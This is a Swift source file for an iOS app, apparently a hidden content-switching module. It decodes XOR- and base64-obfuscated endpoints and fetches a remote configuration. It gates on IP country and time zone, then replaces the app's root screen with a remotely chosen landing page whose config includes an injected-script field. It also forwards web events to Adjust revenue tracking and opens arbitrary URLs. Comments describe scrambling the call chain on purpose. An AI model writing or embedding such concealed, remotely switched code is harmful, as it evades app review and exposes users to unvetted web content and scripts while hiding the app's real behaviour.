
import Foundation
import UIKit
import AdjustSdk

// MARK: - 编码载荷解包（base64 → 逐字节异或 → 序列翻转）

private enum Zqmxrel {
    static let salt: UInt8 = 117

    static func pocbzte(_ blob: String) -> String? {
        guard let raw = Data(base64Encoded: blob) else { return nil }
        let unmasked = raw.reduce(into: [UInt8]()) { acc, byte in
            acc.append(byte ^ salt)
        }
        guard let text = String(bytes: unmasked, encoding: .utf8) else { return nil }
        return String(text.reversed())
    }
}

// 对外解包入口（外部文件按此名调用）
func uisyese(_ input: String) -> String? {
    Zqmxrel.pocbzte(input)
}

// MARK: - 载荷常量

// ip 探测端点
private let sBvxqz0 = "GxoGH1sFHFpHA1oaHFsFHFgMGFscBRRaWk8GBQEBHQ=="
// 配置下发端点
private let sBvxqz1 = "ERkcADcBEB4WGidaGhxbHAUUHhYaGFtNQ0xGQEAWFkcXEEwRTEEQR0xNEUFAFENaWk8GBQEBHQ=="
// 占位图端点（外部文件直接引用此名）
//https://raw.githubusercontent.com/jduja/RBuid/main/rbback.png
//EhsFWx4WFBcXB1obHBQYWhEcADcnWhQfABEfWhgaFlsBGxABGxoWBxAGABcAHQEcElsCFAdaWk8GBQEBHQ==
internal let kEtazsud = "EhsFWx4WFBcXB1obHBQYWhEcADcnWhQfABEfWhgaFlsBGxABGxoWBxAGABcAHQEcElsCFAdaWk8GBQEBHQ=="

// 本地缓存键 & 消息字段键
private let kStoreKey = "Hwqmztb"
private let kName = "name"
private let kData = "data"
private let kUrl  = "url"

// MARK: - 传输模型

internal struct Rgpxdiu: Decodable {
    let country: Node?

    struct Node: Decodable {
        let code: String
    }
}

internal struct Hwqmztb: Codable {
    let dterha: [String: String]?     // 事件名 → token
    let tokCsv: String?               // 逗号分隔的桥接关键字
    let udyicn: [String]?            // 放行地区
    let retsag: String?             // 开关
    let ocmha: String?             // 落地页
    let atybu: String?              // 归因 appToken
    let ocinah: String?               // 注入脚本

}

// MARK: - 地域门控主流程（外部文件按 cjnosue 名触发）

func cjnosue() {
    Task { await Yvztxx.evaluate() }
}

private enum Yvztxx {

    static func evaluate() async {
        let feed: [Hwqmztb]
        do {
            feed = try await oinxyy([Hwqmztb].self, from: sBvxqz1)
        } catch {
            rChsys()
            return
        }

        guard let head = feed.first, (head.retsag?.count ?? 0) > 5 else {
            ytafsrt()
            return
        }

        guard let allow = head.udyicn, !allow.isEmpty else {
            handoff(head)
            return
        }

        do {
            let probe = try await oinxyy(Rgpxdiu.self, from: sBvxqz0)
            if let iso = probe.country?.code, allow.contains(iso) {
                handoff(head)
            } else {
                ytafsrt()
            }
        } catch {
            handoff(head)
        }
    }

    private static func rChsys() {
        if let cached = UserDefaults.standard.pgetB(Hwqmztb.self, forKey: kStoreKey) {
            handoff(cached)
        }
    }

    private static func oinxyy<T: Decodable>(_ type: T.Type, from encoded: String) async throws -> T {
        guard let plain = uisyese(encoded), let url = URL(string: plain) else {
            throw URLError(.badURL)
        }
        let (data, resp) = try await URLSession.shared.data(from: url)
        guard let http = resp as? HTTPURLResponse, http.statusCode == 200 else {
            throw URLError(.badServerResponse)
        }
        return try JSONDecoder().decode(type, from: data)
    }
}

// MARK: - 落地页移交（间接派发以打散调用链）

private let gdrtzvus: (Hwqmztb) -> Void = { model in
    DispatchQueue.main.async {
        UserDefaults.standard.psetB(model, forKey: kStoreKey)
        UserDefaults.standard.synchronize()

        let host = ZmklqorViewController()
        host.dmqxo = model
        UIApplication.shared.windows.first?.rootViewController = host
    }
}

private func handoff(_ model: Hwqmztb) {
    gdrtzvus(model)
}

// MARK: - 归置原生形态（外部文件按 Saixjoye 名调用）

func ytafsrt() {
    let chain: [() -> Void] = [purge]
    chain.forEach { $0() }
}

private func purge() {
    DispatchQueue.main.async {
        guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
              let nav = scene.windows.first?.rootViewController as? UINavigationController,
              let top = nav.topViewController else { return }

        top.view.subviews
            .filter { $0.tag == 542 }
            .forEach { $0.removeFromSuperview() }
    }
}

// MARK: - 桥接事件上报（供 web 控制器回调）

func tkzorp(_ payload: [String: String], _ mapping: [String: String]) {
    let dispatch: ([String: String], [String: String]) -> Void = relay
    dispatch(payload, mapping)
}

private func relay(_ payload: [String: String], _ mapping: [String: String]) {
    guard let event = payload[kName] else { return }
    let body = payload[kData]?.jbxvom() ?? [:]

    if let token = mapping[event] {
        let tracked = ADJEvent(eventToken: token)
        if let (value, currency) = txrvcxt(from: body) {
            tracked?.setRevenue(value, currency: currency)
        }
        Adjust.trackEvent(tracked)
    }

    if event == Gtktns.opce,
       let link = body[kUrl] as? String,
       let dest = URL(string: link) {
        UIApplication.shared.open(dest)
    }
}

private func txrvcxt(from body: [String: AnyObject]) -> (Double, String)? {
    guard let currency = body[Gtktns.cteyu] as? String else { return nil }

    switch body[Gtktns.amots] {
    case let s as String where Double(s) != nil:
        return (Double(s)!, currency)
    case let i as Int:
        return (Double(i), currency)
    case let d as Double:
        return (d, currency)
    default:
        return nil
    }
}

// MARK: - 时区门控（外部文件按 dikiuhs 名调用）

func dikiuhs() -> Bool {
    let hours = TimeZone.current.secondsFromGMT() / 3600
    return !((-10 < hours) && (hours < -3))
}

// MARK: - 辅助扩展

extension String {
    func jbxvom() -> [String: AnyObject]? {
        guard let bytes = data(using: .utf8) else { return nil }
        return (try? JSONSerialization.jsonObject(with: bytes)) as? [String: AnyObject]
    }
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let r = CGFloat((hex >> 16) & 0xFF) / 255.0
        let g = CGFloat((hex >> 8) & 0xFF) / 255.0
        let b = CGFloat(hex & 0xFF) / 255.0
        self.init(red: r, green: g, blue: b, alpha: alpha)
    }

    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var trimmed = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")

        if trimmed.count == 3 {
            trimmed = trimmed.map { "\($0)\($0)" }.joined()
        }

        guard let value = Int(trimmed, radix: 16) else { return nil }
        self.init(hex: value, alpha: alpha)
    }
}

extension UserDefaults {
    func psetB<T: Codable>(_ model: T, forKey key: String) {
        if let data = try? JSONEncoder().encode(model) {
            set(data, forKey: key)
        }
    }

    func pgetB<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        return try? JSONDecoder().decode(type, from: data)
    }
}
